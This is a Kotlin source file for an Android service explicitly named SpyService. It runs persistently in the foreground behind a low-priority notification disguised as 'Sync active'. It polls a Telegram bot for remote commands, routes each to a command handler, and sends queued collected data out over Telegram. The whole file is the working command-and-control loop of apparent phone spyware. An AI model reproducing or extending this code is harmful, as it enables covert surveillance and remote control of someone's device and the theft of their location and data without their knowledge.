package com.you.spy.service

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.you.spy.R
import com.you.spy.net.TgApi
import com.you.spy.util.Config
import com.you.spy.util.Queue
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

class SpyService : Service() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var poller: Job? = null

    override fun onCreate() {
        super.onCreate()
        createChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val type = if (Build.VERSION.SDK_INT >= 34)
            ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
        else 0

        val notif = NotificationCompat.Builder(this, "svc")
            .setSmallIcon(R.drawable.ic_launcher_fg)
            .setContentTitle("Sync active")
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()

        if (Build.VERSION.SDK_INT >= 29) startForeground(1, notif, type)
        else startForeground(1, notif)

        Config.running = true
        if (poller == null) startPoller()

        return START_STICKY
    }

    private fun startPoller() {
        poller = scope.launch {
            while (isActive) {
                if (!Config.connected) { delay(5000); continue }
                runCatching {
                    val updates = TgApi.getUpdates(Config.offset)
                    updates.forEach { u ->
                        Config.offset = u.optLong("update_id") + 1
                        CommandRouter.handle(this@SpyService, u)
                    }
                    flushQueue()
                }.onFailure {
                    if (it.message?.contains("409") == true) delay(3000)
                }
                delay(300)
            }
        }
    }

    private suspend fun flushQueue() {
        if (Queue.size() == 0) return
        Queue.drain().forEach { TgApi.send(it) }
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            val ch = NotificationChannel("svc", "Service", NotificationManager.IMPORTANCE_MIN)
            ch.setShowBadge(false)
            (getSystemService(NotificationManager::class.java)).createNotificationChannel(ch)
        }
    }

    override fun onDestroy() {
        Config.running = false
        scope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
